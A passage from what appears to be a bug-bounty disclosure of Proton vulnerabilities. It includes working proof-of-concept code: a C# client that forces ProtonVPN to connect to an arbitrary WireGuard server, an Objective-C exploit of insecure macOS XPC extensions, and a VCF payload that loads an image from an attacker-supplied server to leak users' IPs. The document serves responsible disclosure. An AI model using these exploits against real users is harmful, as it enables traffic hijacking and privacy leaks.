  VpnHostContract _Host = new VpnHostContract();
  VpnConfigContract _Config = new VpnConfigContract { CustomDns = new List<string>() };
  VpnConnectionRequestContract conReq;
  
  _service = new ServiceChannelFactory();
  _vpnEvents = new VpnEvents();
  
  _vpnClient = new VpnServiceClient(_service, _vpnEvents);
  
  _settingsContract = new SettingsContract();
  _settingsContract.SplitTunnel = new SplitTunnelSettingsContract();
  _settingsContract.SplitTunnel.AppPaths = new String[] { "c:\\random\\application.exe" };
  _settingsContract.SplitTunnel.Mode = SplitTunnelMode.Permit;
  _settingsContract.SplitTcp = true;
  _settingsContract.NetShieldMode = 1;
  _settingsContract.Ipv6LeakProtection = false;
  
  _settingsContract.KillSwitchMode = KillSwitchMode.Off;
  _settingsContract.OpenVpnAdapter = OpenVpnAdapter.Tun;
  _settingsContract.VpnProtocol = VpnProtocol.WireGuard;
  
  _Credentials.Username = "Yeswehack";
  _Credentials.Password=***REDACTED***;
  
  //Bogus key materials
  _Credentials.ClientKeyPair = new AsymmetricKeyPairContract();
  _Credentials.ClientKeyPair.SecretKey = new SecretKeyContract(new ProtonVPN.Crypto.SecretKey("yL1wwd0eY0fqX9V5CV01txULehwntWeRlelATsbQhGAAAAAAAAAAAAAAAAAAABB=",KeyAlgorithm.Ed25519));
  _Credentials.ClientKeyPair.PublicKey= new PublicKeyContract( new ProtonVPN.Crypto.PublicKey("AAAAQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBCCCC", KeyAlgorithm.Ed25519));
  _Credentials.ClientCertPem = "MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwQUE=";
  
  // Host - (The potential malicious Wireguard Server)
  _Host.X25519PublicKey = new ServerPublicKeyContract();
  
  // Configure your IP here
  _Host.Ip = "192.168.1.144";  
  _Host.Label = "24";
  _Host.Name = "poc";
  
  //Bogus Key materials
  _Host.X25519PublicKey.Algorithm = KeyAlgorithmContract.X25519;
  _Host.X25519PublicKey.Base64 = "vI5VPq8i2EsLdJSJW6byJ7cDEJVHaSc8uL32+FydzHA=";
  _Host.X25519PublicKey.Bytes = Encoding.ASCII.GetBytes("QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB");  //Important - it has to decode to a 32-byte key.
  _Host.X25519PublicKey.Pem = "vI5VPq8i2EsLdJSJW6byJ7cDEJVHaSc8uL32+FydzHA=";
  
  //Configuration 
  Dictionary<VpnProtocolContract, int[]> customPorts = new Dictionary<VpnProtocolContract, int[]>();
  customPorts.Add(VpnProtocolContract.WireGuard, new int[] { 51820 });
  _Config.Ports = customPorts;
  _Config.VpnProtocol = VpnProtocolContract.WireGuard;
  
  List<VpnProtocolContract> protos = new List<VpnProtocolContract>();
  protos.Add(VpnProtocolContract.WireGuard);
  
  _Config.PreferredProtocols = protos;
  
  conReq = new VpnConnectionRequestContract();
  
  conReq.Credentials = _Credentials;
  conReq.Protocol = VpnProtocolContract.WireGuard;
  conReq.Servers = new VpnHostContract[2];
  conReq.Servers[0] = _Host;
  conReq.Servers[1] = _Host;
  conReq.Settings = _settingsContract;
  conReq.VpnConfig = _Config;
  
  //Trigger Connection request
  _vpnClient.DoConnect(conReq);
  
  }
  
  static void Main(string[] args)
  {
  Console.WriteLine("___ ProtonVPN app - Force Connect to  arbitrary Wireguard server - PoC ___");
  
  doConnect();
  
  }
  }
  
  public class ServiceChannelFactory
  {
  
  public ServiceChannel<T> Create<T>(string endpoint, object callback)
  {
  DuplexChannelFactory<T> duplexChannelFactory = new DuplexChannelFactory<T>(new InstanceContext(callback), new NetNamedPipeBinding(), GetEndPointAddress(endpoint));
  return new ServiceChannel<T>(duplexChannelFactory, duplexChannelFactory.CreateChannel());
  }
  public ServiceChannel<T> Create<T>(string endpoint)
  {
  ChannelFactory<T> channelFactory = new ChannelFactory<T>(new NetNamedPipeBinding(), GetEndPointAddress(endpoint));
  return new ServiceChannel<T>(channelFactory, channelFactory.CreateChannel());
  }
  
  private static EndpointAddress GetEndPointAddress(string endpointName)
  {
  return new EndpointAddress("net.pipe://localhost/" + endpointName);
  }
  }
  
  public class VpnServiceClient
  {
  private const string Endpoint = "protonvpn-service/connection";
  
  private readonly ServiceChannelFactory _channelFactory;
  private readonly VpnEvents _vpnEvents;
  
  public VpnServiceClient(ServiceChannelFactory channelFactory, VpnEvents vpnEvents)
  {
  _channelFactory = channelFactory;
  _vpnEvents = vpnEvents;
  }
  
  public void DoConnect(VpnConnectionRequestContract connRequest)
  {
  ServiceChannel<IVpnConnectionContract> channel = _channelFactory.Create<IVpnConnectionContract>(Endpoint, _vpnEvents);
  
  channel.Proxy.RegisterCallback();
  Console.WriteLine(connRequest.Servers[0].Ip);
  channel.Proxy.Connect(connRequest);
  
  Console.WriteLine("[+] Connecting...press enter to quit. ");
  Console.ReadLine();
  }
  
  }
  
  [CallbackBehavior(
  ConcurrencyMode = ConcurrencyMode.Single,
  UseSynchronizationContext = false)]
  public class VpnEvents : IVpnEventsContract
  {
  public event EventHandler<VpnStateContract> VpnStateChanged;
  public event EventHandler<ServiceSettingsStateContract> ServiceSettingsStateChanged;
  
  public void OnStateChanged(VpnStateContract e)
  {
  Console.WriteLine("[+] ProtonVPN State changed to " + e.Status.ToString());
  if(e.Status.ToString() == "Disconnected")
  {
  System.Environment.Exit(1);
  }
  Action action = () => VpnStateChanged?.Invoke(this, e);
  
  }
  
  public void OnServiceSettingsStateChanged(ServiceSettingsStateContract e)
  {
  Console.WriteLine("[+] ProtonVPN Service Settings changed " + e.CurrentState.Status.ToString());
  Action action = () => ServiceSettingsStateChanged?.Invoke(this, e);
  
  }
  }
  
  }

  

pocpong.py
  
  
  import socket
  import sys
  
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  
  server_address = ('0.0.0.0', 51820)
  print('starting up on {} port {}'.format(*server_address))
  sock.bind(server_address)
  
  while True:
  print('\nwaiting to receive ProtonVPN ping')
  data, address = sock.recvfrom(38)
  
  print('received {} bytes from {}'.format(len(data), address))
  
  if data:
  sent = sock.sendto(b'\xFE\x01\x01', address)
  print('sent pong  to {}'.format(address))

  

  

#### _YWH-PGM3846-6 - macOS App - WireGuard/OpenVPN Extensions allow insecure XPC connections._

#### _Description_

The ProtonVPN app's Network Extensions (WireGuard and OpenVPN) for macOS do not validate the signature of the process that connects to them through their XPC interface. As a result, any application outside the ProtonVPN app can perform the same actions that are exposed by the Extensions through their XPC interface.

#### _Technical Details_

The listener method does not validate any of the security items recommended by Apple (<https://developer.apple.com/forums/thread/72881>)

  

File: proton/ios-mac-app-9cbfa390042639ca37f5aaaccdd82a571d736905/apps/macos/ExtensionsIPC/IPCBaseConnection.swift

  

  
  
  65: extension XPCBaseService: NSXPCListenerDelegate {
  66: 
  67:  func listener(_ listener: NSXPCListener, shouldAcceptNewConnection newConnection: NSXPCConnection) -> Bool {
  68: 
  69:  // The exported object is this IPCConnection instance.
  70:  newConnection.exportedInterface = NSXPCInterface(with: ProviderCommunication.self)
  71:  newConnection.exportedObject = self
  72: 
  73:  // The remote object is the delegate of the app's IPCConnection instance.
  74:  newConnection.remoteObjectInterface = NSXPCInterface(with: AppCommunication.self)
  75: 
  76:  newConnection.invalidationHandler = {
  77:  self.log("XPC invalidated for mach service \(self.machServiceName)")
  78:  self.currentConnection = nil
  79:  }
  80: 
  81:  newConnection.interruptionHandler = {
  82:  self.log("XPC connection interrupted for mach service \(self.machServiceName)")
  83:  self.currentConnection = nil
  84:  }
  85: 
  86:  if self.currentConnection != nil {
  87:  self.currentConnection?.invalidate()
  88:  self.currentConnection = nil
  89:  }
  90:  
  91:  currentConnection = newConnection
  92:  newConnection.resume()
  93: 
  94:  return true
  95:  }
  96: }

  

As a result, any local application with lower privileges than the ProtonVPN can connect and invoke the exposed methods in the protocol

  

File: proton/ios-mac-app-9cbfa390042639ca37f5aaaccdd82a571d736905/apps/macos/ExtensionsIPC/IPCBaseConnection.swift

  

  
  
  12: /// App -> Provider IPC
  13: @objc protocol ProviderCommunication {
  14:  func getVersion(_ completionHandler: @escaping (Data?) -> Void)
  15:  func getLogs(_ completionHandler: @escaping (Data?) -> Void)
  16:  func setCredentials(username: String, password=***REDACTED*** completionHandler: @escaping (Bool) -> Void)
  17: }

#### _PoC_
  
  
  /* Compile
  gcc exploit.m -o exploit -framework Foundation
  
  Run 
  $ ./exploit
  
  expected output
  ---
  ...
  .. exploit[..] The result is 1
  .. exploit[..] The version is {"version":"2.2.2","build":"2110271532","bundleId":"ch.protonvpn.mac.OpenVPN-Extension"}
  ...
  ---
  
  Test it using a regular user different than the ProtonVPN's app user
  
  */
  
  #import <Foundation/Foundation.h>
  
  @protocol _TtP34ch_protonvpn_mac_OpenVPN_Extension21ProviderCommunication_
  - (void)setCredentialsWithUsername:(NSString *)param1 password=***REDACTED*** *)arg2 completionHandler:(void (^)(BOOL))arg3;
  - (void)getLogs: (void (^)(NSData*))arg1;
  - (void)getVersion:  (void (^)(NSData*))arg1;
  @end
  
  @protocol _TtP34ch_protonvpn_mac_OpenVPN_Extension16AppCommunication_
  @end
  
  @interface ProtonVpnExploit : NSObject <_TtP34ch_protonvpn_mac_OpenVPN_Extension16AppCommunication_>
  -(void)exploit;
  @end
  
  @implementation ProtonVpnExploit
  
  - (instancetype)init
  {
  self = [super init];
  if (self) {
  
  NSLog(@"ProtonVPN Insecure XPC Extensions PoC");
  [self exploit];
  
  }
  return self;
  }
  
  - (void)exploit {
  
  // Wireguard Extension "J6S6Q257EK.group.ch.protonvpn.mac.WireGuard-Extension"
  NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:@"J6S6Q257EK.group.ch.protonvpn.mac.OpenVPN-Extension" options:NSXPCConnectionPrivileged ];
  
  NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(_TtP34ch_protonvpn_mac_OpenVPN_Extension21ProviderCommunication_)];
  
  xpcConnection.remoteObjectInterface = remoteInterface;
  
  xpcConnection.interruptionHandler = ^{
  NSLog(@"Connection Terminated");
  };
  xpcConnection.invalidationHandler = ^{
  NSLog(@"Connection Invalidated");
  };
  
  [xpcConnection resume];
  
  int i = 0;
  
  while(i<50)
  {
  [[xpcConnection remoteObjectProxy] setCredentialsWithUsername: @"yeswehack" password=***REDACTED***testing" completionHandler:^(BOOL result) {
  NSLog(@"The result is %d", result);
  }];
  
  [[xpcConnection remoteObjectProxy] getVersion: ^(NSData *data) {
  NSLog(@"The version is %@",[[NSString alloc]initWithData:data encoding:NSUTF8StringEncoding]);
  }];
          i++;
  }
  
  NSLog(@"Done");
  }
  
  @end
  
  int main() {
  
  [ProtonVpnExploit new];
  
  }

  

#### _YWH-PGM3846-10 Remote content protection bypass while importing contacts from a VCF file_

####  _Description_

An improper handling of the VCARD 'LOGO' property while importing contacts from a VCF file can be abused to automatically load an external image from an arbitrary URL when the victim visits the malicious contact in the ProtonMail '_Contacts_ ' menu.

#### _Technical Details_

The problem lies in the implementation of the VCARD logo property

  

File: WebClients/packages/components/containers/contacts/ContactViewProperty.tsx

  

  
  
  187:  if (field === 'logo') {
  188:  return <RemoteImage src={value} />;
  189:  }

  

When the logo property is detected, Protonmail implements a logic to automatically render the image only when the user settings enable it.

  

However, at line 14 we can see that the interface will 'render' the image if the URL provided in the VCARD's LOGO property is not valid. This shouldn't be a problem as the user will get just a broken image link.

  

File: WebClients/packages/components/components/image/RemoteImage.tsx
  
  
  01: import { DetailedHTMLProps, ImgHTMLAttributes, useState } from 'react';
  02: import { c } from 'ttag';
  03: import { SHOW_IMAGES } from '@proton/shared/lib/constants';
  04: import { isURL } from '@proton/shared/lib/helpers/validators';
  05: import Button from '../button/Button';
  06: import { useMailSettings } from '../../hooks';
  07: 
  08: export interface Props extends DetailedHTMLProps<ImgHTMLAttributes<HTMLImageElement>, HTMLImageElement> {
  09:  src: string;
  10:  text?: string;
  11: }
  12: const RemoteImage = ({ src, text = c('Action').t`Load image`, ...rest }: Props) => {
  13:  const [{ ShowImages } = { ShowImages: SHOW_IMAGES.NONE }, loading] = useMailSettings();
  14:  const [showAnyways, setShowAnyways] = useState(!isURL(src));
  15: 
  16:  const handleClick = () => setShowAnyways(true);
  17: 
  18:  if ((!loading && ShowImages & SHOW_IMAGES.REMOTE) || showAnyways) {
  19:  return <img src={src} referrerPolicy="no-referrer" {...rest} />;
  20:  }
  21:  return <Button onClick={handleClick}>{text}</Button>;
  22: };
  23: 
  24: export default RemoteImage;
  25: 

However, there is a problem in how '_isURL_ ' has been implemented. At line 14 we can see that the function relies in the REGEX_URL to check whether the URL is valid or not.

  

File: WebClients/packages/shared/lib/helpers/validators.ts

  

  
  
  01: import isValidDomain from 'is-valid-domain';
  02: 
  03: /* eslint-disable no-useless-escape */
  04: export const REGEX_URL =
  05:  /((([A-Za-z]{3,9}:(?:\/\/)?)(?:[\-;:&=\+\$,\w]+@)?[A-Za-z0-9\.\-]+|(?:www\.|[\-;:&=\+\$,\w]+@)[A-Za-z0-9\.\-]+)((?:\/[\+~%\/\.\w\-_]*)?\??(?:[\-\+=&;%@\.\w_]*)#?(?:[\.\!\/\\\w]*))?)/;
  06: export const REGEX_HEX_COLOR = /^#([a-f0-9]{3,4}|[a-f0-9]{4}(?:[a-f0-9]{2}){1,2})\b$/i;
  07: export const REGEX_NUMBER = /^\d+$/;
  08: export const REGEX_BASE64_IMAGE = /^data:image\/(?:gif|png|jpeg|bmp|webp|svg\+xml|apng|tiff);base64/;
  09: export const REGEX_PUNYCODE = /^(http|https):\/\/xn--/;
  10: 
  11: export const isEmpty = (value = '') => !value.length;
  12: export const maxLength = (value = '', limit = 0) => value.length <= limit;
  13: export const minLength = (value = '', limit = 0) => value.length >= limit;
  14: export const isURL = (value = '') => REGEX_URL.test(value);

  

Unfortunately, this statement in the REGEXP ':(?:\/\/)?)' which should match a properly formatted URI scheme '://' can be bypassed in React-based applications.

  

The React DOM internally promotes an improper URI scheme such as 'http:/' to 'https://'. As a result, '_isURL_ ' will return false but the React DOM will properly load the external image, thus bypassing the ProtonMail protection against this kind of attack.

  

The following PoC can be used to test this behavior in React.

  

  
  
  import React, { Component } from 'react';
  import { render } from 'react-dom';
  
  class App extends Component {
  render() {
  console.log('App started');
  
  return <img src="http:/google.com/favicon.ico"/>;
  }
  }
  
  render(<App />, document.querySelector('#app'));

poc.vcf
  
  
  BEGIN:VCARD
  VERSION:3.0
  PRODID:-//Sabre//Sabre VObject 4.1.6//EN
  UID:35dd880f-972e-4e56-846c-991839c43e96
  REV;VALUE=DATE-AND-OR-TIME:20200603T133120Z
  FN:ProtonMail automatic URL Loading PoC
  ADR;TYPE=HOME:;;;;;;
  EMAIL;TYPE=HOME:
  TEST.logo:http:/{YOUR_SERVER}/poc.svg
  ORG:reversemode
  END:VCARD

In the ProtonMail Web UI go to the 'Contacts' menu on the upper right corner. Then go to 'Settings' and import contacts from 'poc.vcf'

  

When you visit the imported contact, the remote 'logo' image will be loaded automatically, regardless the user settings.

  

#### _YWH-PGM3846-11 Draft message composer leaks user's IP due to a React Re-Render_

####  _Description_

When a draft is generated and then opened for a received message that contains a remote image (i.e a signature with a remote image), that image will be loaded regardless the user settings.

  

#### _Technical Details_

At line 52 and 53 we can see how when a draft is being processed, the 'removeProtonPrefix' is invoked.

  

File: WebClients/applications/mail/src/app/helpers/transforms/transformRemote.ts
  
  
  28: export const transformRemote = (
  29:  message: MessageExtended,
  30:  mailSettings: Partial<MailSettings> | undefined,
  31:  api: Api,
  32:  messageCache: MessageCache
  33: ) => {
  34:  const showRemoteImages =
  35:  message.messageImages?.showRemoteImages ||
  36:  hasShowRemote(mailSettings) ||
  37:  WHITELIST.includes(message.data?.Sender?.Address || '');
  38: 
  39:  const draft = isDraft(message.data);
  40: 
  41:  const useProxy = hasBit(mailSettings?.ImageProxy, IMAGE_PROXY_FLAGS.PROXY);
  42: 
  43:  const matches = querySelectorAll(message, SELECTOR);
  44: 
  45:  const hasRemoteImages = !!matches.length;
  46: 
  47:  const remoteImages = getRemoteImages(message);
  48: 
  49:  matches.forEach((match) => {
  50:  const id = generateUID('remote');
  51:  if (match.tagName === 'IMG') {
  52:  if (draft) {
  53:  removeProtonPrefix(match);
  54:  } else {
  55:  insertImageAnchor(id, 'remote', match);
  56:  }
  57:  }
  58:  remoteImages.push({
  59:  type: 'remote',
  60:  url: match.getAttribute('proton-src') || '',
  61:  original: match,
  62:  id,
  63:  tracker: undefined,
  64:  status: 'not-loaded',
  65:  });
  66:  });
  67: 
  68:  if (showRemoteImages) {
  69:  void loadRemoteImages(useProxy, message.localID, remoteImages, messageCache, api);
  70:  }

This logic iterates over the attributes of the remote Images contained in the original message in order to transform the custom '_proton-src_ ' attribute into the regular '_src_ ' attribute.

  

File: WebClients/applications/mail/src/app/helpers/message/messageRemotes.ts
  
  
  33: export const removeProtonPrefix = (match: HTMLElement) => {
  34:  ATTRIBUTES.forEach((attr) => {
  35:  const protonAttr = `proton-${attr}`;
  36:  if (match.hasAttribute(protonAttr)) {
  37:  match.setAttribute(attr, match.getAttribute(protonAttr) as string);
  38:  match.removeAttribute(protonAttr);
  39:  }
  40:  });
  41: };

The issue is that the change in the attribute (line 37) may generate a re-render event in the React DOM, thus loading the remote image.

  

#### _YWH-PGM3846-19 'syncMultipleEvents' backend API allows to impersonate attendees and change 'SharedEventContent'_

#### _Description_

The ProtonCalendar security model is detailed here: <https://protonmail.com/blog/protoncalendar-security-model/>

  

A malicious actor with access to an invite will be able to impersonate arbitrary attendees, thus being able to reject or accept and invitation on their behalf.

  

The malicious actor will also be able to change the 'SharedEventContent', thus corrupting it and preventing the organizer to properly manage the event. According to the cryptographic scheme, probably in a fully deployed ProtonCalendar environment it would be possible to control the contents when the malicious actor is also a calendar's member.

#### _Technical Details_

The '_event/sync_ ' API on the backend is not complying with the original logic, according to some of the comments found in the code (line 86)

  

File: WebClients/packages/shared/lib/calendar/serialize.ts
  
  
  86:  // attendees are not allowed to change the SharedEventContent, so they shouldn't send it (API will complain otherwise)
  87:  isSwitchCalendarOfInvitation ? undefined : signPart(sharedPart[SIGNED], signingKey),
  88:  isSwitchCalendarOfInvitation

This endpoint is prone to several vulnerabilities:

  

1\. - It's consuming payloads that shouldn't be sent by the attendees, such as the 'SharedEventContent', which is shared by all the calendars that contain the same Shared event.

2\. - It is possible to update an arbitrary attendee's status by using the victim's '_X-PM-TOKEN_ ' (present in the 'invite.ics') instead of the legitimate token that originally belongs to the attendee.

3.- It doesn't seem to be validating the signatures properly.
